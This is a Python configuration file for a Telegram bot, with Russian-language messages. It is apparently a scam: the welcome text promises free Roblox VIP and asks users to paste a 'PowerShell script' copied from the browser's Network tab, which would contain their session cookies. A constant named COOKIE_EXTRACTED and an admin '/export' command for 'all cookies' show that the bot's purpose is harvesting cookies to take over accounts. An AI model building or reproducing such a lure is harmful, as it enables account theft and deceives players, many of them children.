import os
import sys
from dotenv import load_dotenv
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

load_dotenv()

class Config:
    def __init__(self):
        logger.info("📁 Загрузка конфигурации...")
        
        self.BOT_TOKEN = os.getenv("BOT_TOKEN")
        if not self.BOT_TOKEN:
            logger.error("❌ BOT_TOKEN не найден в переменных окружения!")
            raise ValueError("BOT_TOKEN не установлен")
        
        self.ADMIN_ID = int(os.getenv('ADMIN_ID', 0))
        
        logger.info(f"✅ BOT_TOKEN загружен ({len(self.BOT_TOKEN)} символов)")
        logger.info(f"✅ ADMIN_ID: {self.ADMIN_ID}")

        self.DB_PATH = 'database.db'
         
    # Сообщения
    WELCOME_MESSAGE = """
🤖 *Бот для получения бесплатной випки в Roblox*

Отправьте мне PowerShell скрипт с игрой (текст из Network).

    """
    
    COOKIE_EXTRACTED = """
✅ *Просматриваю игру...*

    """
    
    ADMIN_COMMANDS = """
👑 *Админ-команды:*

📊 /stats - Статистика пользователей
👥 /users - Список всех пользователей
📢 /broadcast - Рассылка всем пользователям
🗑 /delete [id] - Удалить пользователя
📥 /export - Экспорт всех куки
    """
